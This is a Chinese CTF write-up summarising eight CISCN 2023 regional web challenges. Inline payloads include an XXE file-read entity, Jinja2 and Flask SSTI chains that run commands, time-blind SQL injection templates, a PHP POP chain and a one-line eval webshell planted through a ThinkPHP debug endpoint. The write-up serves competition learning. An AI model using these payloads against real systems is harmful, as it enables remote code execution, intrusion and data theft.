---
title: ciscn 国赛华东南分区赛 WEB 方向 WriteUp 分享
contest: CISCN
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [java, deserialize, xxe, ssti, fastapi, jinja2, time-blind, websocket, render]
attack_chain:
  - 审计 Java 反序列化链
  - aspectj 写文件
  - 软链接读 flag
  - PHP 变量覆盖
  - XXE 注入
  - FastAPI 模板注入
  - Flask SSTI 多层 include
  - WebSocket + render 子域 RCE
key_payload: SimpleCache$StoreableCachingMap 反序列化 + 软链接穿越
one_liner: CISCN 2023 华东南分区赛 8 道 WEB 官方 WP 集合，覆盖 Java 反序列化/PHP XXE/Python SSTI/Node WebSocket。
lesson: 现代 CTF WEB 越来越"工业化"——一题往往综合序列化+文件读写+反序列化链+沙箱绕过，单纯一类洞不够。
quality: high
---

CISCN 2023 华东南分区赛 WEB 方向 8 道官方 WP：ezjava / ezphp / OnlineNotepad / funchallenge / Ciscn_Search_Engine / Ciscn_Book_Store_System / Bluebluesky / web-hack。

**ezjava** — Java 反序列化题，aspectj 库 SimpleCache$StoreableCachingMap 写文件。审计发现：解压逻辑支持软链接 → 利用反序列化把 tar 包写到 /tmp/data/ → 解压软链接指向 /flag → 下载文件读 flag。UserBean 任意对象 put 串联 aspectj 链后半段。完整 PoC 用 Java 写 base64 序列化字节流。

**ezphp** — PHP 变量覆盖 + XXE。register.php 处 `$$key = $value` 覆盖 → 写入 user_xml_format。login.php 解析用户 XML 触发 XXE `<!ENTITY xxe SYSTEM "file:///flag">` 一把梭。

**OnlineNotepad** — FastAPI 框架。BaseModel 类似 Spring 把 JSON 转类对象。SSTI 走 Jinja2：`{% set c=b.__globals__ %}{% include 'payl4.html' %}` 多层 include 链 + `os.popen('/readflag').read()` 拿 flag。

**funchallenge** — PHP 反序列化 POP 链。`__wakeup()→__set()→__toString()→__invoke()→query()` 触发 SQL 注入。`$_POST['sql']` 接收序列化对象，最终 `AAA::query($this->c)` 拼 SQL。SQL 注入用 `select/**/if(...)=102,sleep(3),1)` 时间盲注爆字段。

**Ciscn_Search_Engine** — Flask SSTI，过滤 `message/listdir/self/url_for/_/os/read/cat/` 等 30+ 关键字。利用 cookie 传 `c=__class__; b=__bases__; g=__getitem__; s=__subclasses__; ga=get; fa=__init__; fb=__globals__; fc=__builtins__; fd=eval` 拼 `attr(...)` 链 + `__import__('os').popen('/readflag').read()`。

**Ciscn_Book_Store_System** — SQL 盲注。payload 模板 `' union select 1,(case when (select ascii(substr(({0}),{1},1)))={2} then sleep(5) else '1' end),'`，无过滤 select/union/sleep。

**Bluebluesky** — 弱口令 123456 登后台，发现 1day 都修了。利用 ThinkPHP 5.x 调试接口 `/index.php?s=/admin/setting/test_php` 配合 `$IFS` 替代空格执行命令写 `<?=eval($_REQUEST[123]);?>` webshell。

**web-hack** — index.cjs 仅两个接口：websocket + render。websocket 弹计算器；render 通过子域劫持或路径穿越执行模板。
